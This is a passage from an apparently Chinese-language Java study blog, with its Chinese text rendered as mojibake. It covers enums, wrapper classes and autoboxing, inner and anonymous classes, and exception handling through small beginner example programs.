&gt; 0)&#123;            System.out.println(p1.name+&quot;&gt;&quot;+p2.name);        &#125;else if(res &lt; 0)&#123;            System.out.println(p2.name+&quot;&lt;&quot;+p1.name);        &#125;else &#123;            System.out.println(p1.name+&quot;=&quot;+p2.name);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220322225423524.png" alt="image-20220322225423524"></p><h2 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h2><h3 id="æšä¸¾åˆè¯†"><a href="#æšä¸¾åˆè¯†" class="headerlink" title="æšä¸¾åˆè¯†"></a>æšä¸¾åˆè¯†</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220322232627649.png" alt="image-20220322232627649"></p><p>ç¤ºä¾‹ä»£ç :</p><p>Season.java</p><pre><code class="java">package com.sakura.enum2;public enum Season &#123;    SPRING(&quot;æ˜¥æš–èŠ±å¼€&quot;,&quot;æ˜¥å¤©&quot;),    SUMMER(&quot;å¤æ—¥ç‚ç‚&quot;,&quot;å¤å¤©&quot;),    AUTUMN(&quot;ç§‹é«˜æ°”çˆ½&quot;,&quot;ç§‹å¤©&quot;),    WINTER(&quot;ç™½é›ªæºæº&quot;,&quot;å†¬å¤©&quot;);    private String des;    private String name;    Season(String des, String name) &#123;        this.des = des;        this.name = name;    &#125;    Season() &#123;    &#125;    @Override    public String toString() &#123;        return &quot;Season&#123;&quot; +                &quot;des=&#39;&quot; + des + &#39;\&#39;&#39; +                &quot;, name=&#39;&quot; + name + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>test.java</p><pre><code class="java">package com.sakura.enum2;public class test &#123;    String name = &quot;word&quot;;    int num = 200;    Season season = Season.SPRING;    public static void main(String[] args) &#123;        test one =new test();        System.out.println(&quot;one.name = &quot; + one.name);        System.out.println(&quot;one.season = &quot; + one.season.name());        System.out.println(&quot;one.num = &quot; + one.num);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714155112254.png" alt="image-20220714155112254"></p><h3 id="æšä¸¾ç»“æŸ"><a href="#æšä¸¾ç»“æŸ" class="headerlink" title="æšä¸¾ç»“æŸ"></a>æšä¸¾ç»“æŸ</h3><p>ä½¿ç”¨switchè¯­å¥æ¥åˆ¤æ–­æ˜¯å“ªä¸ªæšä¸¾:</p><p>TestSwitch.java</p><pre><code class="java">package com.sakura.enum2;public class TestSwitch &#123;    public static void main(String[] args) &#123;        Season season = Season.SPRING;        switch (season)&#123;            case SPRING:                System.out.println(&quot;æ¸©æš–&quot;);                break;            case SUMMER:                System.out.println(&quot;ç‚çƒ­&quot;);            case AUTUMN:                System.out.println(&quot;èˆ’é€‚&quot;);                break;            case WINTER:                System.out.println(&quot;å¯’å†·&quot;);                break;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714160849714.png" alt="image-20220714160849714"></p><h3 id="æšä¸¾å®ç°æ¥å£"><a href="#æšä¸¾å®ç°æ¥å£" class="headerlink" title="æšä¸¾å®ç°æ¥å£"></a>æšä¸¾å®ç°æ¥å£</h3><p>Gender.java</p><pre><code class="java">package com.sakura.enum3;public enum Gender implements Run&#123;    MAN&#123;        @Override        public void run() &#123;            System.out.println(&quot;ç”·å£« å¤§æ­¥èµ°&quot;);        &#125;    &#125;,WOMAN&#123;        @Override        public void run() &#123;            System.out.println(&quot;å¥³å£« ä¸ç´§ä¸æ…¢çš„èµ°&quot;);        &#125;    &#125;;&#125;interface Run&#123;    void run();&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.enum3;public class Test &#123;    public static void main(String[] args) &#123;        Gender people = Gender.MAN;        people.run();    &#125;&#125;</code></pre><h3 id="ç»ƒä¹ -1"><a href="#ç»ƒä¹ -1" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714222230916.png" alt="image-20220714222230916"></p><p>ç¤ºä¾‹ä»£ç :</p><p>Month.java</p><pre><code class="java">package com.sakura.enum4;public enum Month &#123;    JANUARY(1,&quot;è¿™æ˜¯ä¸€æœˆ&quot;),    FEBRUARY(2,&quot;è¿™æ˜¯äºŒæœˆ&quot;),    March(3,&quot;è¿™æ˜¯ä¸‰æœˆ&quot;),    APRIL(4,&quot;è¿™æ˜¯å››æœˆ&quot;),    MAY(5,&quot;è¿™æ˜¯äº”æœˆ&quot;),    JUNE(6,&quot;è¿™æ˜¯å…­æœˆ&quot;),    JULY(7,&quot;è¿™æ˜¯ä¸ƒæœˆ&quot;),    AUGUST(8,&quot;è¿™æ˜¯å…«æœˆ&quot;),    SEPTEMBER(9,&quot;è¿™æ˜¯ä¹æœˆ&quot;),    OCTOBER(10,&quot;è¿™æ˜¯åæœˆ&quot;),    NOVEMBER(11,&quot;è¿™æ˜¯åä¸€æœˆ&quot;),    DECEMBER(12,&quot;è¿™æ˜¯åäºŒæœˆ&quot;);    private int value;    private String des;    Month(int value, String des) &#123;        this.value = value;        this.des = des;    &#125;    Month() &#123;    &#125;    @Override    public String toString() &#123;        return &quot;Month&#123;&quot; +                &quot;value=&quot; + value +                &quot;, des=&#39;&quot; + des + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.enum4;import java.util.Scanner;public class Test &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;è¯·è¾“å…¥æ‚¨è¦è·å–æœˆä»½æ‰€å¯¹åº”çš„æ•°å­—:&quot;);        Scanner input = new Scanner(System.in);        int num = input.nextInt();        getByValue(num);    &#125;    public static Month getByValue(int value)&#123;        switch (value)&#123;            case 1:                System.out.println(Month.JANUARY);                break;            case 2:                System.out.println(Month.FEBRUARY);                break;            case 3:                System.out.println(Month.March);                break;            case 4:                System.out.println(Month.APRIL);                break;            case 5:                System.out.println(Month.MAY);                break;            case 6:                System.out.println(Month.JUNE);                break;            case 7:                System.out.println(Month.JULY);                break;            case 8:                System.out.println(Month.AUGUST);                break;            case 9:                System.out.println(Month.SEPTEMBER);                break;            case 10:                System.out.println(Month.OCTOBER);                break;            case 11:                System.out.println(Month.NOVEMBER);                break;            case 12:                System.out.println(Month.DECEMBER);                break;        &#125;        return Month.JANUARY; # è¿™ä¸ªåœ°æ–¹çš„returnåªæ˜¯ä¸ºäº†é¿å…æŠ¥é”™ï¼Œæ— ç‰¹æ®Šå«ä¹‰    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714223902463.png" alt="image-20220714223902463"></p><h2 id="åŒ…è£…ç±»åˆè¯†"><a href="#åŒ…è£…ç±»åˆè¯†" class="headerlink" title="åŒ…è£…ç±»åˆè¯†"></a>åŒ…è£…ç±»åˆè¯†</h2><p>Javaæä¾›äº†ä¸¤ä¸ªç±»å‹ç³»ç»Ÿï¼ŒåŸºæœ¬ç±»å‹ä¸å¼•ç”¨ç±»å‹ï¼Œä½¿ç”¨åŸºæœ¬ç±»å‹åœ¨äºæ•ˆç‡ï¼Œç„¶è€Œå½“è¦ä½¿ç”¨åªé’ˆå¯¹å¯¹è±¡è®¾è®¡çš„APIæˆ–æ–°ç‰¹æ€§ï¼ˆä¾‹å¦‚æ³›å‹)ï¼Œé‚£ä¹ˆåŸºæœ¬æ•°æ®ç±»å‹çš„æ•°æ®å°±éœ€è¦ç”¨åŒ…è£…ç±»æ¥åŒ…è£…ã€‚</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714223558341.png" alt="image-20220714223558341"></p><p>æ¯”å¦‚Integeræœ‰å¾ˆå¤šæ–¹æ³•</p><p>test.java</p><pre><code class="java">package com.sakura.wrapper;public class test &#123;    public static void main(String[] args) &#123;        int a = 100;        System.out.println(Integer.MAX_VALUE);        System.out.println(Integer.MIN_VALUE);        String s1 = Integer.toBinaryString(a);        String s2 =Integer.toHexString(a);        System.out.println(&quot;s1 = &quot; + s1);        System.out.println(&quot;s2 = &quot; + s2);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714225729157.png" alt="image-20220714225729157"></p><h2 id="è‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®±"><a href="#è‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®±" class="headerlink" title="è‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®±"></a>è‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®±</h2><p>åŸºæœ¬æ•°æ®ç±»å‹è½¬åŒ–ä¸ºåŒ…è£…ç±»å‹æ•°æ®:</p><p><strong>è€æ–¹æ³•</strong>:</p><p>æ–¹å¼ä¸€:é€šè¿‡æ„é€ å™¨</p><pre><code class="java">Integer æ ‡è¯†ç¬¦ = new Integer(åŸºæœ¬æ•°æ®ç±»å‹);å¦‚: int a = 10;Integer i1 = new Integer(a);</code></pre><p>æ–¹æ³•äºŒ</p><pre><code class="java">Integer æ ‡è¯†ç¬¦ = Integer.valueOf(åŸºæœ¬æ•°æ®ç±»å‹);å¦‚:int a = 10;Integer i2 = Integer.valueOf(a);</code></pre><p><strong>æ–°æ–¹æ³•</strong>:</p><p>è‡ªåŠ¨è£…ç®±</p><pre><code class="java">Integer in = åŸºæœ¬æ•°æ®ç±»å‹;è‡ªåŠ¨è£…ç®±åº•å±‚é‡‡ç”¨çš„æ˜¯ IntegerOf.valueOf(a);</code></pre><p>åŒ…è£…ç±»å‹æ•°æ®è½¬åŒ–ä¸ºåŸºæœ¬ç±»å‹æ•°æ®:</p><pre><code class="java">Integer i4 = new Integer(20);</code></pre><p>æ–¹æ³•ä¸€:è°ƒç”¨åŒ…è£…ç±»å¯¹è±¡çš„ intValue();</p><pre><code class="java">int i = i4.intValue();</code></pre><p>æ–¹æ³•äºŒ:è‡ªåŠ¨æ‹†ç®±</p><p>è‡ªåŠ¨å°†å¼•ç”¨æ•°æ®ç±»å‹å˜ä¸ºåŸºæœ¬æ•°æ®ç±»å‹</p><pre><code class="java">int i =i4;</code></pre><h2 id="åŸºæœ¬ç±»å‹ä¸åŒ…è£…ç±»å‹ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢"><a href="#åŸºæœ¬ç±»å‹ä¸åŒ…è£…ç±»å‹ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢" class="headerlink" title="åŸºæœ¬ç±»å‹ä¸åŒ…è£…ç±»å‹ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢"></a>åŸºæœ¬ç±»å‹ä¸åŒ…è£…ç±»å‹ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢</h2><p>1ã€å­—ç¬¦ä¸²â€”&gt;åŸºæœ¬æ•°æ®ç±»å‹</p><p>Integer.parseInt(â€œå­—ç¬¦ä¸²çº¯æ•°å­—â€); å¦‚æœä¸æ˜¯çº¯æ•°å­—ï¼Œä¼šæŠ¥å¼‚å¸¸,NumberFormatException</p><p>ç¤ºä¾‹ä»£ç :</p><p>test.java</p><pre><code class="java">package com.sakura.wrapper2;import java.util.Scanner;public class test &#123;    public static void main(String[] args) &#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°å­—:&quot;);        String a = input.next();        int b = Integer.parseInt(a);        System.out.println(&quot;b = &quot; + b);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220715152344679.png" alt="image-20220715152344679"></p><p>æ–¹æ³•äºŒ:</p><pre><code>Integer i = new Integer(&quot;å­—ç¬¦ä¸²çº¯æ•°å­—&quot;);</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220715152746653.png" alt="image-20220715152746653"></p><p>æ³¨æ„charä¸­æ²¡æœ‰æ­¤ç±»æ–¹æ³•:</p><pre><code class="java">&quot;AB&quot;.charAt(1); 0ä»£è¡¨ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œ1ä»£è¡¨ç¬¬äºŒä¸ªå­—ç¬¦</code></pre><p>2ã€åŸºæœ¬ç±»å‹æ•°æ®è½¬ä¸ºå­—ç¬¦ä¸²</p><p>æ–¹æ³•ä¸€:</p><pre><code class="java">int a = 10;String ss = &quot;&quot;+a;</code></pre><p>æ–¹æ³•äºŒ:</p><pre><code class="java">int b = 20;string i = String.valueOf(b);</code></pre><h2 id="å¯¹åº”åŒ…è£…ç±»å‹çš„ç¼“å­˜åŒº"><a href="#å¯¹åº”åŒ…è£…ç±»å‹çš„ç¼“å­˜åŒº" class="headerlink" title="å¯¹åº”åŒ…è£…ç±»å‹çš„ç¼“å­˜åŒº"></a>å¯¹åº”åŒ…è£…ç±»å‹çš„ç¼“å­˜åŒº</h2><p>åŒ…è£…ç±»å‹æ•°æ®ï¼Œåªèƒ½æ¥å—å¯¹åº”çš„åŒ…è£…ç±»å‹ï¼Œä¸èƒ½å†é‡‡ç”¨ç±»å‹è‡ªåŠ¨æå‡</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220716155808087.png" alt="image-20220716155808087"></p><p>åŒ…è£…ç±»å‹æœ‰ä¸€ä¸ªç¼“å­˜åŒºï¼Œè¶…è¿‡è¿™ä¸ªåŒºåŸŸï¼Œå°±ä¼šå»newä¸€ä¸ªåŒ…è£…ç±»</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220716160816365.png" alt="image-20220716160816365"></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">public class test &#123;    public static void main(String[] args) &#123;        Integer a = 100;        Integer b = 100;        System.out.println(&quot;1-----&gt;&quot; + (a==b));        Integer c = 1000;        Integer d = 1000;        System.out.println(&quot;2------&gt;&quot;+(c==d));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220716161726283.png" alt="image-20220716161726283"></p><h2 id="é™æ€å†…éƒ¨ç±»"><a href="#é™æ€å†…éƒ¨ç±»" class="headerlink" title="é™æ€å†…éƒ¨ç±»"></a>é™æ€å†…éƒ¨ç±»</h2><p>ä»€ä¹ˆæ˜¯å†…éƒ¨ç±»?</p><p>å°†ä¸€ä¸ªç±»Aå®šä¹‰åœ¨å¦ä¸€ä¸ªç±»Bé‡Œé¢ï¼Œé‡Œé¢çš„é‚£ä¸ªç±»Aå°±ç§°ä¸ºå†…éƒ¨ç±»ï¼ŒBåˆ™ç§°ä¸ºå¤–éƒ¨ç±»ã€‚</p><p> ä½œç”¨:</p><p>1.å¯ä»¥æ‰“ç ´javaå•ç»§æ‰¿çš„é™åˆ¶<br>2.åœ¨å†…éƒ¨ç±»ä¸­åšæ›´å¤šçš„åŠŸèƒ½ä¸ºå¤–éƒ¨ç±»æœåŠ¡<br>3.å¯ä»¥èµ„æºçš„éšè—</p><p>ç‰¹ç‚¹:</p><p>é™æ€å†…éƒ¨ç±»å¯ä»¥è®¿é—®é™æ€å¤–éƒ¨ç±»èµ„æº</p><p>é™æ€çš„å±æ€§ï¼Œé™æ€çš„æ–¹æ³•</p><p>ä¿®é¥°ï¼š</p><p>å¤–éƒ¨ç±»åªèƒ½è¢«publicå’Œpublicä¿®é¥°ï¼Œå†…éƒ¨ç±»æ— é™åˆ¶</p><p>è¯­æ³•ç»“æ„ï¼š</p><pre><code class="java">class å¤–éƒ¨ç±»å&#123;    [æƒé™ä¿®é¥°ç¬¦å››ç§] static [final] class å†…éƒ¨ç±»å&#123;            &#125;&#125;</code></pre><h2 id="éé™æ€å†…éƒ¨ç±»"><a href="#éé™æ€å†…éƒ¨ç±»" class="headerlink" title="éé™æ€å†…éƒ¨ç±»"></a>éé™æ€å†…éƒ¨ç±»</h2><p>ä¸åŠ staticä¿®é¥°çš„å†…éƒ¨ç±»</p><pre><code class="java">class å¤–éƒ¨ç±»å&#123;    [æƒé™ä¿®é¥°ç¬¦å››ç§] class å†…éƒ¨ç±»å&#123;            &#125;&#125;</code></pre><p>ç‰¹ç‚¹ï¼š</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220901212139028.png" alt="image-20220901212139028"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220901212912590.png" alt="image-20220901212912590"></p><h1 id="day13"><a href="#day13" class="headerlink" title="day13"></a>day13</h1><h2 id="å±€éƒ¨å†…éƒ¨ç±»"><a href="#å±€éƒ¨å†…éƒ¨ç±»" class="headerlink" title="å±€éƒ¨å†…éƒ¨ç±»"></a>å±€éƒ¨å†…éƒ¨ç±»</h2><p>ä¸æ˜¯é‡ç‚¹</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220902214930486.png" alt="image-20220902214930486"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220902222245029.png" alt="image-20220902222245029"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220902230731669.png" alt="image-20220902230731669"></p><h2 id="åŒ¿åå†…éƒ¨ç±»çš„å£°æ˜"><a href="#åŒ¿åå†…éƒ¨ç±»çš„å£°æ˜" class="headerlink" title="åŒ¿åå†…éƒ¨ç±»çš„å£°æ˜"></a>åŒ¿åå†…éƒ¨ç±»çš„å£°æ˜</h2><p>åŒ¿åå†…éƒ¨ç±»ï¼šæ²¡æœ‰åå­—çš„ç±»</p><p>åŒ¿åå¯¹è±¡ï¼šæ²¡æœ‰åå­—çš„å¯¹è±¡</p><p>æ–¹å¼ä¸€ï¼š</p><pre><code class="java">new çˆ¶ç±»()&#123;    é‡å†™çˆ¶ç±»æ–¹æ³•&#125;åˆ›å»ºäº†ä¸€ä¸ªå­ç±»ï¼Œä½†æ˜¯å­ç±»æ²¡æœ‰åå­—</code></pre><p>æ–¹å¼äºŒï¼š</p><pre><code class="java">new çˆ¶ç±»(å®å‚åˆ—è¡¨)&#123;    é‡å†™çˆ¶ç±»æ–¹æ³•&#125;åˆ›å»ºäº†ä¸€ä¸ªå­ç±»ï¼Œä½†æ˜¯å­ç±»æ²¡æœ‰åå­—</code></pre><p>æ–¹å¼ä¸‰ï¼š</p><pre><code class="java">new çˆ¶æ¥å£()&#123;    é‡å†™çˆ¶ç±»æ–¹æ³•&#125;åˆ›å»ºäº†ä¸€ä¸ªå­ç±»ï¼Œä½†æ˜¯å­ç±»æ²¡æœ‰åå­—</code></pre><p>æ–¹å¼å››:</p><pre><code class="java">new çˆ¶æŠ½è±¡ç±»()&#123;    é‡å†™çˆ¶ç±»æ–¹æ³•&#125;åˆ›å»ºäº†ä¸€ä¸ªå­ç±»ï¼Œä½†æ˜¯å­ç±»æ²¡æœ‰åå­—</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903003418869.png" alt="image-20220903003418869"></p><p>ç¤ºä¾‹ä»£ç ï¼š</p><pre><code class="java">package com.sakura.innerclass.anosclass;import org.junit.Test;interface Run&#123;    void run();&#125;abstract class Animal&#123;    abstract void eat();&#125;public class TestLocal &#123;    @Test    public void test01()&#123;        new Father()&#123;            @Override            public void show() &#123;                System.out.println(&quot;this is new show-1()&quot;);            &#125;        &#125;;    &#125;    @Test    public void test02()&#123;        new Father(30)&#123;            @Override            public void show() &#123;                System.out.println(&quot;this is new show-2(30)&quot;);            &#125;        &#125;;    &#125;    @Test    public void test03()&#123;        new Run()&#123;            @Override            public void run() &#123;                System.out.println(&quot;this is new Run&quot;);            &#125;        &#125;;    &#125;    @Test    public void test04()&#123;        new Animal()&#123;            @Override            void eat() &#123;                System.out.println(&quot;this is new eat()&quot;);            &#125;        &#125;    &#125;&#125;class Father&#123;    int age;    String name;    public Father(int age)&#123;        this.age=age;    &#125;    public Father()&#123;    &#125;    public void show()&#123;        System.out.println(&quot;this is father show(&quot;);    &#125;&#125;</code></pre><h2 id="åŒ¿åå†…éƒ¨ç±»çš„ä½¿ç”¨"><a href="#åŒ¿åå†…éƒ¨ç±»çš„ä½¿ç”¨" class="headerlink" title="åŒ¿åå†…éƒ¨ç±»çš„ä½¿ç”¨"></a>åŒ¿åå†…éƒ¨ç±»çš„ä½¿ç”¨</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903012609400.png" alt="image-20220903012609400"></p><pre><code class="java">package com.sakura.innerclass.anosclass;import org.junit.Test;interface Fly&#123;    void fly();&#125;public class TestLocal2 &#123;    @Test    public void test03()&#123;        method(new Fly()&#123;            @Override            public void fly() &#123;                System.out.println(&quot;è¶…äººä¼šé£&quot;);            &#125;        &#125;);        &#125;    public static void method(Fly fly) &#123;        fly.fly();    &#125;    @Test    public void test01()&#123;        new Father()&#123;            @Override            public void show() &#123;                System.out.println(&quot;this is new Father show()&quot;);            &#125;        &#125;.show();    &#125;    @Test    public void test02()&#123;        Father father = new Father(99)&#123;            @Override            public void show() &#123;                System.out.println(&quot;this is new Father show-2()&quot;);            &#125;        &#125;;        father.show();        father.test();        System.out.println(father.num);    &#125;&#125;class Father&#123;    int num;    public Father(int num) &#123;        this.num = num;    &#125;    public Father() &#123;    &#125;    public void test()&#123;        System.out.println(&quot;this is Father test&quot;);    &#125;    public void show()&#123;        System.out.println(&quot;this is Father show()&quot;);    &#125;&#125;</code></pre><p>Â·<img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903012819536.png" alt="image-20220903012819536"></p><h2 id="åŒ¿åå†…éƒ¨ç±»ç»ƒä¹ ä¸€"><a href="#åŒ¿åå†…éƒ¨ç±»ç»ƒä¹ ä¸€" class="headerlink" title="åŒ¿åå†…éƒ¨ç±»ç»ƒä¹ ä¸€"></a>åŒ¿åå†…éƒ¨ç±»ç»ƒä¹ ä¸€</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903140738094.png" alt="image-20220903140738094"></p><p>Employee.java</p><pre><code class="java">package com.sakura.innerclass.eaer;public class Employee &#123;    private int num;    private String name;    private double salary;    public Employee(int num, String name, double salary) &#123;        this.num = num;        this.name = name;        this.salary = salary;    &#125;    public void setNum(int num) &#123;        this.num = num;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public void setSalary(double salary) &#123;        this.salary = salary;    &#125;    public int getNum() &#123;        return num;    &#125;    public String getName() &#123;        return name;    &#125;    public double getSalary() &#123;        return salary;    &#125;    @Override    public String toString() &#123;        return &quot;Employee&#123;&quot; +                &quot;num=&quot; + num +                &quot;, name=&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, salary=&quot; + salary +                &#39;&#125;&#39;;    &#125;    public Employee() &#123;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.innerclass.eaer;import java.util.Arrays;import java.util.Comparator;public class Test &#123;    public static void main(String[] args) &#123;        Employee e1 = new Employee(1,&quot;æç™½&quot;,5489.21);        Employee e2 = new Employee(2,&quot;æœç”«&quot;,6984.66);        Employee e3 = new Employee(3,&quot;ç™½å±…æ˜“&quot;,8888.666);        Employee e4 = new Employee(4,&quot;è‹è½¼&quot;,4569.44);        Employee e5 = new Employee(5,&quot;ææ¸…ç…§&quot;,8999.99);        Employee[] employees = &#123;e1,e2,e3,e4,e5&#125;;//        SortEmployee sortEmployee = new SortEmployee();        System.out.println(&quot;æ’åºå‰&quot;);        arrayprint(employees);        System.out.println(&quot;æ’åºå&quot;);        Arrays.sort(employees, new Comparator() &#123;            @Override            public int compare(Object o1, Object o2) &#123;                Employee e1 = (Employee)o1;                Employee e2 = (Employee)o2;                return Double.compare(e1.getSalary(),e2.getSalary());            &#125;        &#125;);        arrayprint(employees);    &#125;    public static void arrayprint(Employee[] e)&#123;        for (Employee employee : e) &#123;            System.out.println(employee);        &#125;    &#125;&#125;</code></pre><p>è¿™é‡Œä½¿ç”¨äº†åŒ¿åå†…éƒ¨ç±»ï¼Œè¦é‡ç‚¹å…³æ³¨</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903153227023.png" alt="image-20220903153227023"></p><p>è¿è¡Œç»“æœï¼š</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903154308675.png" alt="image-20220903154308675"></p><h2 id="æ³¨è§£"><a href="#æ³¨è§£" class="headerlink" title="æ³¨è§£"></a>æ³¨è§£</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903160756959.png" alt="image-20220903160756959"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903161608984.png" alt="image-20220903161608984"></p><h2 id="é¡¹ç›®-å®¢æˆ·ä¿¡æ¯ç®¡ç†ç³»ç»Ÿ"><a href="#é¡¹ç›®-å®¢æˆ·ä¿¡æ¯ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="é¡¹ç›®:å®¢æˆ·ä¿¡æ¯ç®¡ç†ç³»ç»Ÿ"></a>é¡¹ç›®:å®¢æˆ·ä¿¡æ¯ç®¡ç†ç³»ç»Ÿ</h2><h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903162255657.png" alt="image-20220903162255657"></p><h2 id><a href="#" class="headerlink" title></a><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903162314145.png" alt="image-20220903162314145"></h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903162332627.png" alt="image-20220903162332627"></p><h2 id="å¼€å‘ç®€å•æ¶æ„"><a href="#å¼€å‘ç®€å•æ¶æ„" class="headerlink" title="å¼€å‘ç®€å•æ¶æ„"></a>å¼€å‘ç®€å•æ¶æ„</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903162934336.png" alt="image-20220903162934336"></p><h1 id="day14"><a href="#day14" class="headerlink" title="day14"></a>day14</h1><h2 id="å¼‚å¸¸ä½“ç³»"><a href="#å¼‚å¸¸ä½“ç³»" class="headerlink" title="å¼‚å¸¸ä½“ç³»"></a>å¼‚å¸¸ä½“ç³»</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906211332365.png" alt="image-20220906211332365"></p><h2 id="å¼‚å¸¸çš„æ¼”ç¤º"><a href="#å¼‚å¸¸çš„æ¼”ç¤º" class="headerlink" title="å¼‚å¸¸çš„æ¼”ç¤º"></a>å¼‚å¸¸çš„æ¼”ç¤º</h2><pre><code class="java">package com.sakura.exception;import org.junit.Test;public class test1 &#123;    @Test    public void arryException()&#123;        int[] arr = &#123;1,2,3&#125;;        try &#123;            System.out.println(arr[3]);        &#125;catch (ArrayIndexOutOfBoundsException e)&#123;            e.printStackTrace(); //æ‰“å°å¼‚å¸¸ä¿¡æ¯            e.getMessage(); //è·å–å¼‚å¸¸ä½ç½®            System.out.println(&quot;è¯¥è¡Œä»£ç å·²æ‰§è¡Œï¼&quot;);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906220355874.png" alt="image-20220906220355874"></p><h2 id="ä½¿ç”¨try-catchå¤„ç†å¼‚å¸¸"><a href="#ä½¿ç”¨try-catchå¤„ç†å¼‚å¸¸" class="headerlink" title="ä½¿ç”¨try catchå¤„ç†å¼‚å¸¸"></a>ä½¿ç”¨try catchå¤„ç†å¼‚å¸¸</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906224711456.png" alt="image-20220906224711456"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906225236503.png" alt="image-20220906225236503"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906225500468.png" alt="image-20220906225500468"></p><p>ä½†æ˜¯è¿™ç§å†™èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œå¦‚æœé‡‡ç”¨äº†å¤šå±‚catchï¼Œæˆ‘ä»¬å¯ä»¥çœç•¥ä¸ºä¸€ä¸ªException</p><pre><code class="java">try&#123;    &#125;catch(xxx)&#123;    &#125;catch(xxx)&#123;    &#125;catch(Exception e)&#123;&#125;</code></pre><h2 id="ä½¿ç”¨try-catch-finallyå¤„ç†å¼‚å¸¸"><a href="#ä½¿ç”¨try-catch-finallyå¤„ç†å¼‚å¸¸" class="headerlink" title="ä½¿ç”¨try catch finallyå¤„ç†å¼‚å¸¸"></a>ä½¿ç”¨try catch 